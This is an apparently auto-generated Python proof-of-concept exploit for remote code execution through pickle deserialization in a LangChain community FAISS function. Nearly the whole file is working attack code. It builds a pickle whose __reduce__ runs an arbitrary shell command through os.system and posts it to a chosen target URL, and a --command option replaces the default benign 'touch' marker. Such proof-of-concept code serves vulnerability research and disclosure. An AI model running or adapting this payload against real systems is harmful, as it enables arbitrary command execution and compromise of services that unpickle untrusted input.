#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_calls_deserialize_from_bytes_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE via pickle deserialization in langchain-community-only.

Vulnerability: The function deserialize_from_bytes in FAISS vectorstore calls pickle.loads()
on attacker-controlled bytes without any validation. This allows arbitrary code execution.

The exploit simulates an attacker sending a malicious pickle payload to a vulnerable endpoint
that uses this library function. The payload executes a benign command (touch /tmp/poc_success.txt)
to demonstrate code execution.

Usage:
    python3 exploit.py [--target http://localhost:8000/api/v1/trigger]
"""

import argparse
import base64
import pickle
import os
import sys
import requests
import subprocess
from typing import Any, Dict

# ---------------------------------------------------------------------------
# Step 1: Create a malicious pickle payload
# ---------------------------------------------------------------------------

class MaliciousPickle:
    """
    A class that executes a command when unpickled via __reduce__.
    The command is configurable and defaults to a benign touch command.
    """
    def __reduce__(self):
        # This will be called during unpickling
        # Return (callable, args) - pickle will call callable(*args)
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_payload(command: str = "touch /tmp/poc_success.txt") -> bytes:
    """
    Create a pickle payload that executes the given command when deserialized.
    
    Args:
        command: The shell command to execute (default: benign touch)
    
    Returns:
        Serialized pickle bytes
    """
    class RCE:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(RCE())

# ---------------------------------------------------------------------------
# Step 2: Simulate the vulnerable endpoint interaction
# ---------------------------------------------------------------------------

def send_exploit(target_url: str, payload: bytes) -> Dict[str, Any]:
    """
    Send the malicious pickle payload to the vulnerable endpoint.
    
    The payload is base64-encoded to simulate how it might be transmitted
    (e.g., via JSON API parameter or file upload).
    
    Args:
        target_url: The vulnerable endpoint URL
        payload: The malicious pickle bytes
    
    Returns:
        Response dictionary with status and details
    """
    # Encode payload as base64 string (common pattern for binary data in APIs)
    encoded_payload = base64.b64encode(payload).decode('utf-8')
    
    # Prepare the request - the vulnerable function expects bytes directly
    # In a real scenario, this might be sent as a file upload or raw bytes
    headers = {
        'Content-Type': 'application/octet-stream',
        'X-Exploit-Demo': 'true'
    }
    
    try:
        print(f"[*] Sending malicious pickle payload to {target_url}")
        print(f"[*] Payload size: {len(payload)} bytes")
        print(f"[*] Base64 encoded: {encoded_payload[:50]}...")
        
        # Send the raw pickle bytes as the request body
        response = requests.post(
            target_url,
            data=payload,
            headers=headers,
            timeout=10
        )
        
        return {
            'status_code': response.status_code,
            'response_text': response.text[:500] if response.text else '',
            'success': response.status_code < 500  # Assume success if not server error
        }
        
    except requests.exceptions.ConnectionError as e:
        return {
            'status_code': None,
            'response_text': f"Connection error: {e}",
            'success': False
        }
    except requests.exceptions.Timeout as e:
        return {
            'status_code': None,
            'response_text': f"Timeout error: {e}",
            'success': False
        }
    except Exception as e:
        return {
            'status_code': None,
            'response_text': f"Unexpected error: {e}",
            'success': False
        }

# ---------------------------------------------------------------------------
# Step 3: Verify code execution
# ---------------------------------------------------------------------------

def verify_exploit() -> bool:
    """
    Check if the benign payload executed successfully by looking for the marker file.
    
    Returns:
        True if /tmp/poc_success.txt exists (command executed)
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS: Marker file {marker_file} exists - command executed!")
        # Clean up the marker file
        try:
            os.remove(marker_file)
            print("[*] Cleaned up marker file")
        except:
            pass
        return True
    else:
        print("[-] Marker file not found - command may not have executed")
        return False

# ---------------------------------------------------------------------------
# Main execution
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for pickle deserialization RCE in langchain-community-only"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000/api/v1/trigger",
        help="Target URL of the vulnerable endpoint (default: http://localhost:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify exploit by checking for marker file after execution"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LangChain-Community-Only Pickle Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    # Create the malicious payload
    print("[*] Creating malicious pickle payload...")
    payload = create_malicious_payload(args.command)
    print(f"[*] Payload created: {len(payload)} bytes")
    print()
    
    # Send the exploit
    print("[*] Sending exploit to target...")
    result = send_exploit(args.target, payload)
    
    print(f"[*] Response status: {result['status_code']}")
    print(f"[*] Response text: {result['response_text'][:200]}...")
    print()
    
    # Verify if requested
    if args.verify:
        print("[*] Verifying code execution...")
        if verify_exploit():
            print("[+] Exploit successful - arbitrary code execution achieved!")
            sys.exit(0)
        else:
            print("[-] Could not verify code execution")
            sys.exit(1)
    else:
        print("[*] To verify execution, check for /tmp/poc_success.txt")
        print("[*] Or run with --verify flag")
        sys.exit(0)

if __name__ == "__main__":
    main()
